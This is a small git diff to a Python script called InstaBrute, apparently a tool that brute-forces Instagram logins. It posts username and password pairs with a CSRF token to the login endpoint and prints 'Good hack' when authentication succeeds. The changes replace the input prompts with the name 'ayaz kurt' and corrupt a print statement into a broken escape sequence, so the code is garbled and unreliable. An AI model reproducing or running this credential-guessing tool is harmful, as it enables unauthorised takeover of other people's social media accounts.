@@ -32,8 +32,8 @@ class InstaBrute(object):
     def __init__(self):
 
         try:
-            user = input('username : ')
-            Combo = input('passList : ')
+            user = input('ayaz kurt : ')
+            Combo = input('ayaz kurt : ')
             print('\n----------------------------')
 
         except:
@@ -80,7 +80,7 @@ class InstaBrute(object):
                 "Referer": "https://www.instagram.com/accounts/login/",
                 "x-csrftoken": csrf
             })
-            print(f'{user}:{pwd}\n----------------------------')
+            print(f'{user}:{pwd}\ayaz kurt')
 
             if 'authenticated": true' in r.text:
                 print(('' + user + ':' + pwd + ' --> Good hack '))
